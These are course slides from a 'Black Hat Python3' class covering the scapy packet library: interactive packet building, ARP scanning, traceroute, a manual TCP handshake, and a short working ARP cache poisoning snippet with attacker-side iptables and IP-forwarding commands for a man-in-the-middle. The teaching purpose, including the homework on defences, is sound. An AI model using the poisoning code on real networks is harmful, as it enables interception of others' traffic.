## Welcome to class 5!

### Black Hat Python3 

### Raleigh ISSA

---

## Github repo

https://github.com/tiarno/bhp3_class

---

## Summary from last class

- UDP scanning
- Git commands on local
- Git commands for remote/upstream
- python import techniques
- code reuse (`getwords`)
- context managers

---

## scapy

- python library
- interative tool using Python REPL (shell)
- create, decode, send, receive packets

---

## Interactive scapy shell

```python
>>> IP()
<IP |>
>>> target="www.google.com/30"
>>> ip=IP(dst=target)
>>> ip
<IP  dst=<Net www.google.com/30> |>
>>> ips = [p for p in ip]
>>> ips
[<IP  dst=172.217.4.36 |>, <IP  dst=172.217.4.37 |>, 
 <IP  dst=172.217.4.38 |>, <IP  dst=172.217.4.39 |>]

>>> a = ips[0]
>>> a.dst
172.217.4.36
>>> a.ttl
64
```

---

## Another view

```
>>> str(a)
"b'E\\x00\\x00\\x14\\x00\\x01\\x00\\x00@\\x00\\x07\\xff\\xc0\\xa8\\x01E\\xac\\xd9\\x04$'"
>>> new_ip = IP(str(a))
>>> new_ip
<IP  version=6 ihl=2 tos=0x27 len=17756 id=30768 flags=MF frag=4188 ttl=120 proto=dsr chksum=0x305c src=120.49.52.92 dst=120.48.48.92 options=[<IPOption  copy_flag=0 optclass=3 option=upstream_multicast_packet length=48 value='1\\x00\\x00@\\x00\\x07\\xff\\xc0\\xa8\\x01E\\x' |>] |<Raw  load="ac\\xd9\\x04$'" |>>
>>> new_ip.hide_defaults()
>>> new_ip
```

---

## `lsc()`, `ls()`

- IP
- TCP
- ICMP

---

## Common Commands

- rdppcap
- wrpcap
- send
- sr
- sniff
- filter (BPF)

---

## ARP

```python
ether = Ether(dst="ff:ff:ff:ff:ff:ff")
arp = ARP(pdst='192.168.1.69/24')
ans, unans = srp(ether/arp, iface='en0', timeout=2) #Layer2
for snd, rcv in ans:
    print(rcv.sprintf(r"%ARP.psrc% %Ether.src%").split())
```

---

## Scapy Graphics

```python
res, unans = traceroute(['reachtim.com'], dport=[443], maxttl=20, retry=-2)

res.graph()
```

---

```python
hosts = [
    'www.microsoft.com', 'www.cisco.com', 
    'www.yahoo.com', 'www.wanadoo.fr', 
    'www.pacsec.com']

res, unans = traceroute(hosts, dport=[80,443], maxttl=20, retry=-2)
```

---

```python
a = Ether()/IP(dst="www.slashdot.org")/TCP()/"GET /index.html HTTP/1.0 \n\n"

hexdump(a)

a[0].pdfdump(layer_shift=1)
```
http://www.asciitable.com

---

## BPF

http://biot.com/capstats/bpf.html

## Three-way Handshake

- on attacker:
    - `iptables -t filter -I OUTPUT -p tcp --sport 10000 --tcp-flags RST RST -j DROP`
    - mac: `sysctl -w net.inet.ip.forwarding=1`
    - linux: `echo 1 > /proc/sys/net/ipv4/ip_forward`
- on target: `tcpdump -ni any port 8000 -S`

---

```python
me, sport = '192.168.1.69', 10000
them, dport = '192.168.1.100', 8000
#
ip = IP(src=me, dst=them)
syn = TCP(sport=sport, dport=dport, flags='S', seq=1000)
synack = sr1(ip/syn)
ack = TCP(sport=sport, dport=dport, flags='A', seq=synack.ack, ack=synack.seq+1)
send(ip/ack)
```

---

## ARP Poison

- poison ARP cache of two devices
- tell each device attacker MAC is the other's address
- man-in-the-middle: monitor communications

---

## ARP Poison code

```python
mymac = get_if_hwaddr('en0')
victim = '192.168.1.100'
gateway = '192.168.1.254'
packet = Ether()/ARP(op='who-has', hwsrc=mymac, psrc=victim, pdst=gateway)
sendp(packet)
packet = Ether()/ARP(op='who-has', hwsrc=mymac, psrc=gateway, pdst=victim)
sendp(packet)
```

---

## Python Named Tuples

- immutable
- reference values like object properties
- more readable code

```
Point = namedtuple('Point', 'x y')
pt = Point(1.0, 2.0)
pt.x
pt.y
```

---

## ARP Poison Program

`arper.py`

---

## Your Job

- Reading (links below)
- Create your ARP Poison program
- Recreate your network scanner using scapy
- Consider ways to protect against it

---

## Reading


1. https://scapy.net/demo/
2. https://thepacketgeek.com/series/building-network-tools-with-scapy/
3. https://www.cisco.com/c/en/us/products/collateral/switches/catalyst-6500-series-switches/white_paper_c11_603839.html
4. https://codingsec.net/2016/06/arp-spoofing-attack/
5. http://biot.com/capstats/bpf.html

 
---

## Feedback please!

- tim@reachtim.com
- discord: https://discord.gg/WR23qUj

